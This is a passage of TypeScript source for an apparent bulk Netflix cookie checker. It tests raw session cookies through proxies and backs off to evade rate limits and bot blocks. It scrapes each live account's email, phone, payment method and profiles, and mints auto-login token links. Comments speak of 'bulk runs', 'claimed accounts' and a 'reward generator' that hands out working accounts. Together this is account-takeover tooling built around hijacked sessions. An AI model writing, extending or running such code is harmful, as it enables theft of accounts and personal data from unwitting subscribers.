// "dead cookie". A proxy-served block page won't carry these Netflix-specific
// login markers, so it won't be mistaken for a genuine expired session.
function looksLikeNetflixLoggedOut(html: string): boolean {
  if (!html) return false
  const h = html.slice(0, 40_000).toLowerCase()
  if (!h.includes("netflix")) return false
  return (
    h.includes("nfheaderlogo") ||
    h.includes('id="appmountpoint"') ||
    h.includes("memberSignup".toLowerCase()) ||
    h.includes("loginform") ||
    h.includes('action="/login') ||
    (h.includes("sign in") && h.includes("password")) ||
    (h.includes("login") && h.includes("netflix.com/signup"))
  )
}

// Parses a `Retry-After` header value (RFC 7231: either delta-seconds or an HTTP
// date) into milliseconds. Returns undefined when absent/unparseable. Clamped to
// a sane 1s–5min range so a hostile/garbage value can't freeze the direct path.
function parseRetryAfterMs(raw: string | null): number | undefined {
  if (!raw) return undefined
  const trimmed = raw.trim()
  let ms: number | undefined
  if (/^\d+$/.test(trimmed)) {
    ms = Number(trimmed) * 1000
  } else {
    const when = Date.parse(trimmed)
    if (!Number.isNaN(when)) ms = when - Date.now()
  }
  if (ms === undefined || !Number.isFinite(ms)) return undefined
  return Math.min(5 * 60_000, Math.max(1_000, Math.round(ms)))
}

// Probes whether the account has the extra-member add-on. Non-fatal: any failure
// just yields `undefined` so it never blocks the main result.
async function probeExtraMembers(
  rawCookie: string,
  dispatcher: Dispatcher = netflixAgent,
  timeoutMs: number = REQUEST_TIMEOUT_MS,
): Promise<boolean | undefined> {
  try {
    const res = await fetch(EXTRA_MEMBER_URL, {
      method: "GET",
      headers: { ...BROWSER_HEADERS, Cookie: rawCookie },
      redirect: "manual",
      dispatcher,
      signal: AbortSignal.timeout(timeoutMs),
    })
    // Drain the body so the socket can be reused.
    await res.text().catch(() => "")
    return res.status === 200
  } catch {
    return undefined
  }
}

export function collectProfileNames(html: string): string[] | undefined {
  const names: string[] = []
  const seen = new Set<string>()
  const add = (value: string) => {
    const name = decodeEscapes(value).replace(/\\u0027/g, "'").trim()
    const key = name.toLocaleLowerCase()
    if (name && !seen.has(key) && name.length <= 80) {
      seen.add(key)
      names.push(name)
    }
  }
  const patterns = [
    /["']profileName["']\s*:\s*["']([^"']+)["']/gi,
    /["']profile_name["']\s*:\s*["']([^"']+)["']/gi,
    /data-profile-name=["']([^"']+)["']/gi,
    /aria-label=["'](?:profile|profile name)[:\s-]+([^"']+)["']/gi,
  ]
  for (const pattern of patterns) for (const match of html.matchAll(pattern)) add(match[1])
  return names.length ? names : undefined
}

// Fetches the FULL list of profile names from the profiles-management gate.
// The /account page only inlines the active profile, so without this only one
// profile ever shows. Non-fatal: any failure yields `undefined` and the caller
// falls back to whatever the account page contained.
async function fetchProfiles(
  rawCookie: string,
  dispatcher: Dispatcher = netflixAgent,
  timeoutMs: number = REQUEST_TIMEOUT_MS,
): Promise<string[] | undefined> {
  for (let attempt = 0; attempt < 2; attempt += 1) {
    try {
      const res = await fetch(PROFILES_URL, {
        method: "GET",
        headers: { ...BROWSER_HEADERS, Cookie: rawCookie },
        redirect: "follow",
        dispatcher,
        signal: AbortSignal.timeout(timeoutMs),
      })
      const html = await res.text().catch(() => "")
      if (!isNetflixHost(res.url || "") || !/\/profiles/i.test(res.url || "")) continue
      const profiles = collectProfileNames(html)
      if (profiles?.length) return profiles
    } catch {
      // Retry once; profile enrichment is non-fatal.
    }
  }
  return undefined
}

// Mints a Netflix auto-login token from the iOS FTL endpoint and returns the
// auth links. Non-fatal: returns undefined on any failure so a valid cookie still
// reports as valid even if token minting hiccups.
async function fetchAuthLinks(
  rawCookie: string,
  dispatcher: Dispatcher = netflixAgent,
  timeoutMs: number = REQUEST_TIMEOUT_MS,
): Promise<CheckResult["links"]> {
  const netflixId = readCookieValue(rawCookie, "NetflixId")
  if (!netflixId) return undefined
  try {
    const res = await fetch(`${TOKEN_URL}?${TOKEN_PARAMS.toString()}`, {
      method: "GET",
      headers: { ...TOKEN_HEADERS, Cookie: `NetflixId=${netflixId}` },
      dispatcher,
      signal: AbortSignal.timeout(timeoutMs),
    })
    if (!res.ok) {
      await res.text().catch(() => "")
      return undefined
    }
    const data = (await res.json().catch(() => null)) as Record<string, any> | null
    const token = data?.value?.account?.token?.default?.token
    if (typeof token === "string" && token.length > 0) {
      return buildAuthLinks(token)
    }
    return undefined
  } catch {
    return undefined
  }
}

// Public helper: mints the Netflix auto-login (nftoken) direct links for a cookie
// over a direct connection. Used to attach PC/Mobile/TV links to distributed and
// claimed accounts (which are stored without links). Returns undefined if the
// cookie can't mint a token (e.g. dead) — callers treat links as optional.
// Mints Netflix auto-login (nftoken) links from a cookie. Accepts an optional
// dispatcher so callers can route the FTL token request through a WORKING PROXY —
// Netflix's iOS FTL host (ios.prod.ftl.netflix.com) is far more aggressively
// bot-blocked than the account page, so a datacenter/serverless IP that can read
// the account page still frequently gets refused here. Routing through the same
// kind of proxy the checker uses is what reliably yields links. Defaults to the
// direct dispatcher when none is supplied.
export async function mintAuthLinks(
  rawCookie: string,
  dispatcher?: Dispatcher,
): Promise<CheckResult["links"]> {
  return fetchAuthLinks(rawCookie, dispatcher)
}

// Checks a single RAW cookie string directly against Netflix.
// Returns the normalized result, plus a retry-aware error on transient failures.
export async function checkCookieNative(
  rawCookie: string,
  opts: { includeRaw: boolean; dispatcher?: Dispatcher; includeLinks?: boolean; timeoutMs?: number },
): Promise<{ result: CheckResult; error?: NativeError }> {
  if (!rawCookie) {
    return { result: { valid: false, message: "No cookie provided.", errorCategory: "invalid_input" } }
  }

  // Route through the supplied proxy dispatcher when present; otherwise the
  // shared direct-connection agent.
  const dispatcher: Dispatcher = opts.dispatcher ?? netflixAgent
  // Per-request timeout: callers dialing through a free proxy pass the short
  // PROXY_REQUEST_TIMEOUT_MS so a slow proxy is abandoned fast (fail over to a
  // fresh one); the direct path uses the generous default.
  const timeoutMs = opts.timeoutMs ?? REQUEST_TIMEOUT_MS

  let res: Awaited<ReturnType<typeof fetch>>
  try {
    res = await fetch(ACCOUNT_URL, {
      method: "GET",
      headers: { ...BROWSER_HEADERS, Cookie: rawCookie },
      // FOLLOW redirects: a VALID session is 302-redirected from the legacy
      // /YourAccount path to the modern /account page (status 200, full account
      // JSON). A DEAD session is instead redirected to /login. So we follow the
      // chain and judge by the FINAL url + page content, NOT by the first 3xx —
      // treating every redirect as dead was the bug that failed valid cookies.
      redirect: "follow",
      dispatcher,
      signal: AbortSignal.timeout(timeoutMs),
    })
  } catch (err) {
    const isTimeout = err instanceof Error && (err.name === "TimeoutError" || err.name === "AbortError")
    const category: CheckErrorCategory = isTimeout ? "timeout" : "upstream_unavailable"
    const message = isTimeout ? "Netflix request timed out." : "Could not reach Netflix."
    return { result: { valid: false, message, errorCategory: category }, error: { errorCategory: category } }
  }

  const finalUrl = res.url || ""

  // SECURITY — refuse to trust a response that didn't end on a real Netflix host.
  // If a hostile proxy redirected us off-domain, this is NOT a valid verdict: treat
  // it as a proxy problem to retry on a fresh proxy, never as alive/dead.
  if (!isNetflixHost(finalUrl)) {
    await res.text().catch(() => "")
    return {
      result: {
        valid: false,
        message: "Response did not come from Netflix — will retry.",
        errorCategory: "upstream_unavailable",
      },
      error: { errorCategory: "upstream_unavailable" },
    }
  }

  // Landed on the login/sign-up page → the cookie is dead/expired.
  if (/\/login|\/signup|\/loginhelp/i.test(finalUrl)) {
    await res.text().catch(() => "")
    return { result: { valid: false, message: "Cookie expired or invalid." } }
  }

  // Non-2xx after following redirects → Netflix problem / block / rate limit.
  if (!res.ok) {
    await res.text().catch(() => "")
    const category = categorize(res.status)
    // Honor Netflix's own Retry-After when it gives one (429s usually do). This
    // is what lets the direct-IP cooldown match the REAL throttle window.
    const retryAfterMs = parseRetryAfterMs(res.headers.get("retry-after"))
    return {
      result: {
        valid: false,
        message:
          category === "rate_limited"
            ? "Rate limited by Netflix — backing off."
            : `Netflix returned ${res.status}.`,
        errorCategory: category,
        retryAfterMs,
      },
      error: { errorCategory: category, retryAfterMs },
    }
  }

  const html = await res.text().catch(() => "")
  const info = extractAccountInfo(html)

  // A logged-in account page yields account fields and inlines a `reactContext`
  // blob; a logged-out page shows a Sign In CTA and no account data. Require
  // account data (or a clear members-area signal) as the authoritative "alive".
  const hasAccountData = Boolean(info.email || info.countryCode || info.plan)
  const looksLoggedIn = /\/account/i.test(finalUrl) && html.includes("reactContext")

  if (!hasAccountData && !looksLoggedIn) {
    // No account data AND not on the account page. Before calling this DEAD, make
    // sure we're actually looking at Netflix's logged-out page and NOT a proxy
    // block / bot-challenge / geo interstitial — those must NOT be trusted as a
    // dead verdict (they're a proxy problem to retry, not an expired cookie).
    if (isBlockedInterstitial(html) || !looksLikeNetflixLoggedOut(html)) {
      return {
        result: {
          valid: false,
          message: "Couldn't verify through this proxy — will retry.",
          errorCategory: "upstream_unavailable",
        },
        error: { errorCategory: "upstream_unavailable" },
      }
    }
    return { result: { valid: false, message: "Cookie expired or invalid." } }
  }

  // REGION GUARD — an authenticated session can still be unable to stream a title
  // in the verifier's region. Treat this as an authoritative dead result for now.
  if (info.regionLocked) {
    return {
      result: {
        valid: false,
        regionLocked: true,
        plan: info.plan,
        countryCode: info.countryCode,
        profiles: info.profiles,
        message: "Region locked — this account or title is unavailable in the checker region (treated as dead).",
      },
    }
  }

  // MEMBERSHIP GUARD — at this point the SESSION is valid (we're on a real account
  // page), but the membership itself may be inactive: cancelled or never started.
  // Those render the account page yet CAN'T stream — the "free" / "not working"
  // accounts we must not report as alive. Netflix states this in `membershipStatus`.
  // We only reject on a DEFINITIVELY non-working status; an absent or unrecognized
  // status keeps the prior behavior so we never introduce a false dead. This is an
  // authoritative (no errorCategory) dead verdict.
  const DEAD_MEMBERSHIP = new Set(["FORMER_MEMBER", "NEVER_MEMBER", "ANONYMOUS"])
  const status = info.membershipStatus?.toUpperCase()
  if (status && DEAD_MEMBERSHIP.has(status)) {
    return { result: { valid: false, message: "Membership inactive — account not working." } }
  }

  // ON-HOLD: Netflix couldn't process the last payment ("Your account is on hold.
  // Retry your payment?"). The session logs in and renders the account page, but the
  // membership CANNOT stream — so per product decision it is counted as DEAD. We
  // still tag it with membershipOnHold + the resolved plan/country/profiles so the
  // UI can label it precisely ("Account on hold — payment failed") instead of a
  // generic failure, and so it never enters the saved/distributable pool.
  //
  // Detected two ways because Netflix is inconsistent:
  //   1. membershipStatus === "ON_HOLD" (older/edge markup), and
  //   2. the AUTHORITATIVE GrowthHoldMetadata flag isUserOnHold === true — which is
  //      set even while membershipStatus still reads "CURRENT_MEMBER" (a payment-
  //      failure hold). Without (2) these payment-failed accounts slip through as
  //      fully-working and get handed out by the reward generator — the exact bug
  //      this guards against.
  const membershipOnHold = status === "ON_HOLD" || info.isUserOnHold === true
  if (membershipOnHold) {
    return {
      result: {
        valid: false,
        membershipOnHold: true,
        // Surface context so the dead card can explain WHY it's dead.
        plan: info.plan,
        countryCode: info.countryCode,
        profiles: info.profiles,
        message: "Account on hold — last payment failed, so it can't stream (treated as dead).",
      },
    }
  }

  // PLAN GUARD (strict) — "alive" must be a COMPLETELY working account WITH a plan.
  // A valid session that we can't resolve to a real, non-expired tier
  // (Premium/Standard/Basic/Mobile) is treated as dead. `info.plan` was resolved
  // from Netflix's own plan field → locale-independent video-quality/stream
  // signals, so legitimate accounts in any language still classify; only sessions
  // with no readable active plan fall through here. This deliberately accepts a
  // small rate of false-deads in exchange for never reporting a planless/unknown
  // account as alive. Authoritative dead (no errorCategory) so recheck/distribution
  // treat it as confirmed.
  if (!info.plan || /\bexpired?\b|\bcancel(l)?ed\b|\binactive\b/i.test(info.plan)) {
    return { result: { valid: false, message: "No active plan — account not working." } }
  }

  // Alive — enrich in parallel: extra-member probe + the full profile list (the
  // account page only carries the active profile). Auth links are minted by an
  // EXTRA Netflix request (the iOS FTL token endpoint), so we only fetch them
  // when explicitly asked — skipping it makes each alive check noticeably faster
  // and cuts one sub-request per cookie, easing Netflix rate-limit pressure on
  // large bulk runs.
  const [extraMembers, links, allProfiles] = await Promise.all([
    probeExtraMembers(rawCookie, dispatcher, timeoutMs),
    opts.includeLinks ? fetchAuthLinks(rawCookie, dispatcher, timeoutMs) : Promise.resolve(undefined),
    fetchProfiles(rawCookie, dispatcher, timeoutMs),
  ])

  const result: CheckResult = {
    valid: true,
    email: info.email,
    // Plan is ALWAYS the canonical parent tier (e.g. "Premium"), never
    // "Premium (Extra Member)". Whether the account has extra members is tracked
    // separately via `extraMember` so we never fragment plan stats/filters.
    plan: info.plan,
    extraMember: extraMembers ?? false,
    countryCode: info.countryCode,
    paymentMethod: info.paymentMethod,
    memberSince: info.memberSince,
    nextBillingCycle: info.nextBillingCycle,
    phone: info.phone,
    maxStreams: info.maxStreams,
    // Prefer the full list from the profiles gate; fall back to whatever the
    // account page inlined (the active profile) if the gate fetch failed.
    profiles: Array.from(new Set([...(info.profiles ?? []), ...(allProfiles ?? [])])),
    emailVerified: info.emailVerified,
    links,
    // On-hold accounts already returned as dead above, so a result reaching here is
    // a genuinely working, streamable membership.
    message: "Cookie is active.",
  }
  if (opts.includeRaw) {
    result.raw = { account: info, extraMembers: extraMembers ?? false, hasLinks: Boolean(links) }
  }
  return { result }
}
